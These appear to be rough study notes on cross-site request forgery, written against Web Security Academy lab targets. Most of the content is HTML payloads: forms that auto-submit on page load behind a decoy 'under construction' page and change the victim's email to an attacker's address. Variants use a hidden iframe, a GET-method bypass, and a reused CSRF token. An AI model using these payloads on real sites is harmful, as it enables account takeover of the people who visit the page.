# Enumeration
```python
- check for the rules of the web server - SOP, CORS, SameSite Cookie, Referer, Origin.
```


# Craft a malicious request
- when victim user load this html, it will automatically submit the forms that request a POST HTTP method to vulnerable to CSRF web server and they will redirect to that website. Use iframe if you do not want them to redirect.


```html
<html>
	<body>
		<h1>The website is under construction.</h1>
		<form method="POST" action="vulnerable@website.com">
			<input type="hidden" name="email" value="attackermail@gmail.com"/>
		</form>

		<script>
			document.forms[0].submit();
		</script>

	</body>
</html>
```


# Using iframe to avoid redirect
- when a victim visits this website, it will request to the vulnerable website but it will load to the iframe which the display is set to none, they will only see the h1 tag.

```python
<html>
	<body>
		<h1>The website is under construction.</h1>
		<iframe style="display: none" name="csrf_iframe"></iframe>
		<form method="POST" action="https://vulnerable@website.com" target="csrf_iframe">
			<input type="hidden" name="email" value="attackermail@gmail.com"/>
		</form>

		<script>
			document.forms[0].submit();
		</script>

	</body>
</html>
```



# Used other HTTP method
```python
>> check if other HTTP method such as GET request can bypass some CSRF defense
	- craft empty form's tag, but change the method to GET request and put all the data on input type hidden

<html>
	<body>
		<h1>The website is under construction.</h1>
		<form method="get" action="https://0a1f007804a09ca0840cc3c700e60044.web-security-academy.net/my-account/change-email">
                        <input type="hidden" name="email" value="anotheremail@gmail.com"/>
		</form>
		<script>
			document.forms[0].submit();
		</script>

	</body>
</html>

```

# CSRF token not validated
```python
- an application can be misconfigured like checking if it is only set else it would not reject the request rather accept it and bypass that CSRF token.
- craft a malicious request without the CSRF token in input tag
```

# CSRF token is not tied to user's session
```python
- other application find specific token to a pool of tokens which can be bypass by using their token as a valid CSRF token.
- the application always change the CSRF token, so logging in to the website and get your CSRF token which can be used to 


<html>
	<body>
		<h1>The website is under construction.</h1>
		<form method="post" action="https://0abb00d004c9494885862c8000b10080.web-security-academy.net/my-account/change-email">
                        <input type="hidden" name="email" value="attacker@email.net"/>
                        <input type="hidden" name="csrf" value="Aq425nuptr7QypXK1461FdaBOmk1LQNp"/>
		</form>
		<script>
			document.forms[0].submit();
		</script>
	</body>
</html>

```



# 









